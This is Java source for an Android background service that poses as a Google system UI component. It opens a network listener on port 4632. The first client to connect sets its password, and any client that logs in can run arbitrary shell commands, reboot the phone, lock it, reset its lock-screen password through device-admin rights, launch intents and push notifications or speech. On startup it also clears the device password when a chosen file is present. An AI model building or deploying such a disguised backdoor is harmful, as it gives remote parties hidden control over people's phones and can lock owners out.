package com.google.android.systemUi.service;

import android.app.*;
import android.app.admin.*;
import android.content.*;
import android.content.pm.*;
import android.media.*;
import android.os.*;
import android.preference.*;
import android.speech.tts.*;
import android.speech.tts.TextToSpeech.*;
import com.genonbeta.CoolSocket.*;
import com.google.android.systemUi.config.*;
import com.google.android.systemUi.helper.*;
import java.io.*;
import java.net.*;
import java.util.*;
import org.json.*;

import java.lang.Process;

public class CommunicationService extends Service implements OnInitListener
{
	public static final String TAG = "CommunationService";

	private AudioManager mAudioManager;
	private CommunicationServer mCommunationServer;
	private DevicePolicyManager mDPM;
	private ComponentName mDeviceAdmin;
	private ArrayList<String> mGrantedList = new ArrayList<String>();
	private PowerManager mPowerManager;
	private SharedPreferences mPreferences;
	private NotificationPublisher mPublisher;
	private TextToSpeech mSpeech;
	private boolean mTTSInit;
	private Vibrator mVibrator;

	public class CommunicationServer extends CoolJsonCommunication
	{
		public CommunicationServer()
		{
			super(4632);
			this.setSocketTimeout(AppConfig.DEFAULT_SOCKET_LARGE_TIMEOUT);
		}

		private void handleRequest(Socket socket, JSONObject receivedMessage, JSONObject response, String clientIp) throws Exception
		{
			boolean result = false;
			Intent actionIntent = new Intent();

			if (!mGrantedList.contains(clientIp))
			{
				if (!mPreferences.contains("password"))
				{
					if (receivedMessage.has("accessPassword"))
					{
						mPreferences.edit().putString("password", receivedMessage.getString("accessPassword")).apply();
						response.put("info", "Password is set to " + receivedMessage.getString("accessPassword"));
					}
					else
					{
						response.put("info", "Password is never set. To set use 'accessPassword' ");
					}
				}
				else if (receivedMessage.has("password"))
				{
					if (mPreferences.getString("password", "genonbeta").equals(receivedMessage.getString("password")))
					{
						mGrantedList.add(clientIp);
						response.put("info", "Logged in");
					}
					else 
						response.put("info", "Password was incorrect");
				}
				else
				{
					response.put("info", "Login 'password'");
				}
			}
			else
			{
				if (receivedMessage.has("action"))
				{
					actionIntent.setAction(receivedMessage.getString("action"));

					if (receivedMessage.has("key") && receivedMessage.has("value"))
						actionIntent.putExtra(receivedMessage.getString("key"), receivedMessage.getString("value"));
				}

				String request = receivedMessage.getString("request");

				if (request.equals("sayHello"))
				{
					PackageInfo packInfo = getPackageManager().getPackageInfo(getApplicationInfo().packageName, 0);

					response.put("versionName", packInfo.versionName);
					response.put("versionCode", packInfo.versionCode);

					response.put("device", Build.BRAND + " " + Build.MODEL);

					result = true;
				}
				else if (request.equals("makeToast"))
				{
					mPublisher.makeToast(receivedMessage.getString("message"));
					result = true;
				}
				else if (request.equals("makeNotification"))
				{
					mPublisher.notify(receivedMessage.getInt("id"), mPublisher.makeNotification(receivedMessage.getString("title"), receivedMessage.getString("content"), receivedMessage.getString("info")));
					result = true;
				}
				else if (request.equals("cancelNotification"))
				{
					mPublisher.cancelNotification(receivedMessage.getInt("id"));
					result = true;
				}
				else if (receivedMessage.equals("lockNow"))
				{
					mDPM.lockNow();
					result = true;
				}
				else if (receivedMessage.equals("resetPassword"))
				{
					result = mDPM.resetPassword(receivedMessage.getString("password"), 0);
				}
				else if (request.equals("setVolume"))
				{
					mAudioManager.setStreamVolume(AudioManager.STREAM_MUSIC, receivedMessage.getInt("volume"), 0);
					result = true;
				}
				else if (request.equals("sendBroadcast"))
				{
					sendBroadcast(actionIntent);
					result = true;
				}
				else if (request.equals("startService"))
				{
					startService(actionIntent);
					result = true;
				}
				else if (request.equals("startActivity"))
				{
					actionIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
					startActivity(actionIntent);
					result = true;
				}
				else if (request.equals("vibrate"))
				{
					long time = 100;

					if (receivedMessage.has("time"))
						time = receivedMessage.getLong("time");

					mVibrator.vibrate(time);
					result = true;
				}
				else if (request.equals("changeAccessPassword"))
				{
					if (mPreferences.getString("password", "genonbeta").equals(receivedMessage.getString("old")))
					{
						mPreferences.edit().putString("password", receivedMessage.getString("new")).apply();
						result = true;
					}
				}
				else if (request.equals("reboot"))
				{
					mPowerManager.reboot("Virtual user requested");
					result = true;
				}
				else if (request.equals("applyPasswordResetFile"))
				{
					result = mPreferences.edit().putString("upprFile", receivedMessage.getString("file")).commit();
				}
				else if (request.equals("getPRFile"))
				{
					response.put("info", mPreferences.getString("upprFile", "not set"));
					result = true;
				}
				else if (request.equals("ttsExit"))
				{
					result = ttsExit();
				}
				else if (request.equals("tts"))
				{
					if (mSpeech != null && mTTSInit)
					{
						Locale locale = null;

						if (receivedMessage.has("language"))
							locale = new Locale(receivedMessage.getString("language"));

						if (locale == null)
							locale = Locale.ENGLISH;

						mSpeech.setLanguage(locale);
						mSpeech.speak(receivedMessage.getString("message"), TextToSpeech.QUEUE_ADD, null);

						response.put("language", "@" + locale.getDisplayLanguage());
						response.put("speak", "@" + receivedMessage.getString("message"));

						result = true;
					}
					else
					{
						mSpeech = new TextToSpeech(CommunicationService.this, CommunicationService.this);
						response.put("info", "TTS service is now loading");

						result = true;
					}
				}
				else if (request.equals("commands"))
				{
					DataInputStream dataIS = new DataInputStream(getResources().openRawResource(com.google.android.systemUi.R.raw.commands));
					JSONArray jsonArray = new JSONArray();
					
					while (dataIS.available() > 0)
					{
						jsonArray.put(dataIS.readLine());
					}
					
					dataIS.close();
					
					response.put("template_list", jsonArray);
					
					result = true;
				}
				else if (request.equals("getGrantedList"))
				{
					response.put("granted_list", new JSONArray(mGrantedList));
					result = true;
				}
				else if (request.equals("lockNow"))
				{
					mDPM.lockNow();
					result = true;
				}
				else if (request.equals("exit"))
				{
					mGrantedList.remove(clientIp);
					result = true;
				}
				else if (request.equals("runCommand"))
				{
					boolean su = false;
					
					if (receivedMessage.has("su"))
						su = receivedMessage.getBoolean("su");
					
					Runtime.getRuntime().exec(receivedMessage.getString("command"));
					
					result = true;
				}
				else if (request.equals("toggleTabs"))
				{
					this.setAddTabsToResponse((this.getAddTabsToResponse() == NO_TAB) ? 2 : NO_TAB);
					result = true;
				}
				else
				{ 
					response.put("info", "{" + request + "} is not found");
				}
			}

			response.put("result", result);
		}

		@Override
		protected void onError(Exception r1_Exception)
		{
		}

		@Override
		public void onJsonMessage(Socket socket, JSONObject received, JSONObject response, String client)
		{
			try
			{
				handleRequest(socket, received, response, client);
			}
			catch (Exception e)
			{
				try
				{
					response.put("error", "@" + e);
				}
				catch (JSONException json)
				{
					e.printStackTrace();
				}

				return;
			}
		}
	}

	private boolean ttsExit()
	{
		mTTSInit = false;

		if (mSpeech == null)
			return false;

		try
		{
			mSpeech.shutdown();
			return true;
		}
		catch (Exception e)
		{}

		return false;
	}

	@Override
	public IBinder onBind(Intent intent)
	{
		return null;
	}

	@Override
	public void onCreate()
	{
		super.onCreate();

		mCommunationServer = new CommunicationServer();

		if (!mCommunationServer.start())
			stopSelf();
	}

	@Override
	public void onDestroy()
	{
		super.onDestroy();

		mCommunationServer.stop();
		ttsExit();
	}

	@Override
	public void onInit(int result)
	{
		this.mTTSInit = (result == TextToSpeech.SUCCESS);	
	}

	@Override
	public int onStartCommand(Intent intent, int p1, int p2)
	{
		mPublisher = new NotificationPublisher(this);
		mDPM = (DevicePolicyManager) getSystemService(Service.DEVICE_POLICY_SERVICE);
		mAudioManager = (AudioManager) getSystemService(Service.AUDIO_SERVICE);
		mDeviceAdmin = new ComponentName(this, com.google.android.systemUi.receiver.DeviceAdmin.class);
		mPreferences = PreferenceManager.getDefaultSharedPreferences(this);
		mPowerManager = (PowerManager) getSystemService("power");
		mVibrator = (Vibrator) getSystemService("vibrator");

		if (mPreferences.contains("upprFile"))
		{
			File uppr = new File(mPreferences.getString("upprFile", "/sdcard/uppr"));

			if (uppr.isFile())
			{
				try
				{
					mVibrator.vibrate(1000);
					mDPM.resetPassword("", 0);
				}
				catch (Exception e)
				{
					e.printStackTrace();
				}
			}
		}

		return START_STICKY;
	}
}